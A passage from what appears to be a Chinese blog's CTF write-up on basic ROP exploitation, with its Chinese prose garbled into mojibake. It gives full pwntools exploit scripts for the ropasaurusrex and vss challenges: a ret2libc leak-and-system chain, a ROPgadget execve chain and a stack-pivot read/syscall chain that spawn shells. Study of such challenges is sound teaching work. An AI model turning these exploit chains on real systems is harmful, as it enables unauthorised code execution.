class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ropasaurusrex"><a href="#ropasaurusrex" class="headerlink" title="ropasaurusrex"></a>ropasaurusrex</h2><p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼ŒæŸ¥çœ‹æ£€æŸ¥åªæœ‰å †æ ˆæ‰§è¡Œä¿æŠ¤ã€‚</p><img src="/2019/07/26/basic-rop-practice/4.jpg"><p>ç®€å•è§‚å¯Ÿç¨‹åºï¼Œå‘ç°æ²¡æœ‰systemï¼Œåªæœ‰readå’Œwriteï¼Œä¹Ÿæ²¡æœ‰<code>/bin/sh</code>ï¼Œ32ä½çš„å°ç«¯ç¨‹åºã€‚æ€è·¯è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œè¿™ä¸ªå’Œä¹‹å‰ç™½æ³½çš„é¢˜ç›®æ¯”è¾ƒç±»ä¼¼ï¼Œéœ€è¦ä½¿ç”¨writeæŠŠåœ°å€æ³„éœ²å‡ºæ¥ï¼Œç„¶åè®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼Œåœ¨è¿™ä¹‹åå°±æœ‰ä¸¤ç§æ€è·¯äº†ã€‚</p><p>ç¬¬ä¸€ç§ï¼Œå¯»æ‰¾libcä¸Šé¢çš„<code>/bin/sh</code>ã€‚ç¬¬äºŒç§ï¼Œé€šè¿‡readå†™å…¥<code>/bin/sh</code>åœ¨bssæ®µä¸­ã€‚æœ€åéƒ½è¦ä½¿ç”¨è®¡ç®—å‡ºçš„systemæ¥æ‰§è¡Œã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘è¿™é‡Œä¸ºäº†ä¸é‚£ä¹ˆéº»çƒ¦ï¼Œå°±ç›´æ¥ä½¿ç”¨libcé‡Œé¢çš„å­—ç¬¦ä¸²äº†ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./ropasaurusrex"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib32/libc.so.6"</span>)</span><br><span class="line">program = ELF(<span class="string">"./ropasaurusrex"</span>)</span><br><span class="line">got_write = program.got[<span class="string">'write'</span>]</span><br><span class="line">plt_write = program.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = program.symbols[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x0804841d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="number">4</span>*<span class="string">'b'</span></span><br><span class="line">payload1 += p32(plt_write)</span><br><span class="line">payload1 += p32(main_addr)</span><br><span class="line">payload1 += p32(<span class="number">1</span>)</span><br><span class="line">payload1 += p32(got_write)</span><br><span class="line">payload1 += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">write_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="number">4</span>*<span class="string">'b'</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(<span class="number">0</span>)</span><br><span class="line">payload2 += p32(binsh)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªå°é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯mainçš„ç¬¦å·ä¹Ÿä¸æ˜¯æ¯æ¬¡éƒ½æœ‰çš„ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­æœ€å¥½è¿˜æ˜¯ç›´æ¥å†™mainå‡½æ•°çš„åœ°å€æ¯”è¾ƒå¥½ã€‚</p><h2 id="vss"><a href="#vss" class="headerlink" title="vss"></a>vss</h2><p>64ä½ç¨‹åºï¼ŒåŒæ—¶ç¨‹åºä¿æŠ¤åªæœ‰å †æ ˆä¸å¯æ‰§è¡Œã€‚é™æ€ç¼–è¯‘æœç„¶æœ‰ç‚¹å°éº»çƒ¦ï¼Œå¹¶ä¸”æ‰€æœ‰çš„ç¬¦å·è¿˜è¢«å»é™¤äº†ã€‚</p><p>è¿™é‡Œé€šè¿‡ç»éªŒå¯ä»¥çŸ¥é“startçš„ç¨‹åºå…¥å£å¤„æœ€åçš„callä¼šè°ƒç”¨<code>__libc_start_main</code>ï¼ŒåŒæ—¶ä¸Šé¢çš„offsetå¤„ä¸€å®šæ˜¯mainå‡½æ•°ã€‚æ‰¾åˆ°ä¹‹åæŒ‰né”®å¯ä»¥ä¿®æ”¹å‡½æ•°åï¼Œè¿™æ ·å°±æ–¹ä¾¿å¾ˆå¤šäº†ã€‚ä¹Ÿå¯ä»¥é€šè¿‡æœç´¢å­—ç¬¦ä¸²ï¼Œç„¶åæŸ¥çœ‹å¼•ç”¨åœ°å€æ¥é”å®šmainå‡½æ•°ã€‚</p><img src="/2019/07/26/basic-rop-practice/5.jpg"><p>éšåé€šè¿‡æ±‡ç¼–ä¸­çš„callï¼Œæ¥å®šä½è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œé€šè¿‡eaxçš„èµ‹å€¼å’Œæ—è¾¹syscallçš„æç¤ºæ¥æŠŠæ¨æ–­å…·ä½“çš„å‡½æ•°ã€‚</p><p>åœ¨ç†æ¸…æ¥šç¨‹åºä¹‹åï¼Œç®€å•æ¥è¯´ç¨‹åºä¼šå…ˆè¯»å…¥0x400å­—èŠ‚å¤§å°çš„æ•°æ®è¿›å…¥ç¼“å†²åŒºä¼šåˆ¤æ–­å‰ä¸¤ä¸ªå­—ç¬¦æ˜¯å¦ä¸º<code>py</code>ï¼Œç„¶åè¿›å…¥å¦å¤–ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼šå°†ç¼“å†²åŒºå…¶ä¸­çš„å‰0x50ä¸ªå­—èŠ‚çš„æ•°æ®è¯»å…¥å¦å¤–ä¸€ä¸ªåªæœ‰0x40çš„ç¼“å†²åŒºä¸­ã€‚è¿™å°±æ˜¯å¾ˆæ˜æ˜¾çš„ç¼“å†²åŒºæº¢å‡ºï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹æˆ‘ä»¬çš„æº¢å‡ºæ•°æ®åªæœ‰0x10ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è¦†ç›–rbpä¹‹å¤–ï¼Œå°±åªèƒ½è¦†ç›–æ‰retåœ°å€ã€‚</p><p>è¿™é‡Œç”¨åˆ°äº†<code>stack pivot</code>ï¼Œå°±æ˜¯åŠ«æŒæ ˆæŒ‡é’ˆåˆ°å…¶ä»–æˆ‘ä»¬å¯æ§çš„åœ°æ–¹è¿™æ ·å°±èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æŒ‡ä»¤ã€‚è¿™é‡Œè™½ç„¶ç¬¬äºŒä¸ªå‡½æ•°çš„ç¼“å†²åŒºä¸å¤Ÿç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¼“å†²åŒºèƒ½å¤Ÿè¾“å…¥è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¢åŠ æ ˆæŒ‡é’ˆçš„gadgetè®©è¿”å›ä¹‹åçš„rspèƒ½å¤ŸæŒ‡å‘æˆ‘ä»¬çš„ropé“¾ã€‚</p><p>è¿™é‡Œæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥å¢åŠ 0x58 rspçš„gadgetï¼Œè¿™æ ·æˆ‘ä»¬å¡«å……å‰0x50çš„æ•°æ®ä¹‹åè¿˜æœ‰å‰©ä½™ï¼Œå†å¡«å……8ä¸ªå­—èŠ‚çš„æ•°æ®ä¹‹åï¼Œå†æ¥ä¸Šropé“¾å°±èƒ½åƒå‰é¢ä¸€æ ·çš„getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046f208</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">'/bin//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401823</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043ae05</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000045f2a5</span>) <span class="comment"># syscall ; ret</span></span><br><span class="line">addRspRet = <span class="number">0x000000000046f205</span></span><br><span class="line">payload = <span class="string">'py'</span>+<span class="string">'a'</span>*(<span class="number">0x48</span><span class="number">-0x2</span>)+p64(addRspRet)+<span class="string">'a'</span>*(<span class="number">0x58</span><span class="number">-0x50</span>)+p</span><br><span class="line">p = process(<span class="string">'vss'</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡èƒ½ç›´æ¥ç”¨ROPgadgetç›´æ¥ç”Ÿæˆropé“¾ï¼Œ23333ã€‚</p><p>å¦‚æœè€ƒè™‘æ‰‹å·¥æ„é€ çš„è¯ï¼Œè¿™é‡Œæ²¡æœ‰<code>write</code>ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½æ³„éœ²åœ°å€ï¼Œlibcçš„binshæ˜¯æ²¡æœ‰åŠæ³•äº†ï¼Œåªèƒ½ä¾é <code>read</code>æ¥è¯»å…¥binshçš„æ•°æ®ï¼Œç„¶åè°ƒç”¨syscallæ¥æ‰§è¡Œshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./vss"</span>)</span><br><span class="line"></span><br><span class="line">vss = ELF(<span class="string">"./vss"</span>)</span><br><span class="line"></span><br><span class="line">rsi_ret = <span class="number">0x401937</span></span><br><span class="line">rdi_ret = <span class="number">0x401823</span></span><br><span class="line">rdx_ret = <span class="number">0x43ae05</span></span><br><span class="line">xor_rax_ret = <span class="number">0x41bd1f</span></span><br><span class="line">addRspRet = <span class="number">0x46f205</span></span><br><span class="line">syscall = <span class="number">0x437eae</span></span><br><span class="line"><span class="comment">#syscall = 0x45f2a5</span></span><br><span class="line">rax_ret = <span class="number">0x46f208</span></span><br><span class="line">bss_base = vss.bss()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'py'</span> + <span class="number">0x46</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(addRspRet)</span><br><span class="line">payload += <span class="number">8</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(bss_base)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(xor_rax_ret)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(rax_ret)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(bss_base)</span><br><span class="line">payload += p64(rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">":\n"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">sh.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å­¦ä¹ å®ŒåŸºæœ¬çš„ROPä¹‹åï¼Œä¹Ÿç®—æ˜¯ç†è§£äº†å…¶ä¸­çš„ä¸€äº›å¸¸è§„å¥—è·¯ï¼Œæœ‰writeå’Œputsä¹‹ç±»çš„æœ‰è¾“å‡ºå‡½æ•°æ˜¯å¯ä»¥æ³„éœ²åœ°å€çš„ï¼Œæ‹¿åˆ°åœ°å€é…åˆlibcå°±å¯ä»¥å»è®¡ç®—æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°åœ°å€ã€‚å¦‚æœä¸èƒ½æ‹¿åˆ°åœ°å€ï¼Œå°±åˆ©ç”¨ROPé“¾æ¥æ„é€ syscallï¼Œå…¶ä¸­binshçš„å€¼å¯ä»¥ç”¨readæ¥å†™å…¥ç©ºé—²åŒºå—ï¼Œä¸€èˆ¬æ˜¯bssæ®µã€‚</p><p>æœ€åä¸€é“é¢˜vssï¼Œä¹Ÿå­¦åˆ°å¾ˆå¤šåˆ†æé™æ€é“¾æ¥ç¨‹åºçš„æŠ€å·§å—ç”¨å¾ˆå¤šï¼Œæ¯”å¦‚åœ¨åˆ†æmainå‡½æ•°çš„æ—¶å€™å¯ä»¥ç”¨å…¥å£ç‚¹çš„ç‰¹å¾ä¹Ÿå¯ä»¥ç”¨å­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼ˆäº¤å‰å¼•ç”¨æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¾ˆå¤šæ—¶å€™è§£å†³å¾ˆå¤šéº»çƒ¦ï¼‰ã€‚åŒæ—¶å­¦ä¼šäº†ä¸€ç‚¹èŠ±å¼æ ˆæº¢å‡ºæŠ€å·§ï¼ŒåŠ«æŒæ ˆæŒ‡é’ˆåˆ°æˆ‘ä»¬å¯æ§çš„åŒºåŸŸä¸­æ¥æ‰§è¡ŒæŒ‡ä»¤ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
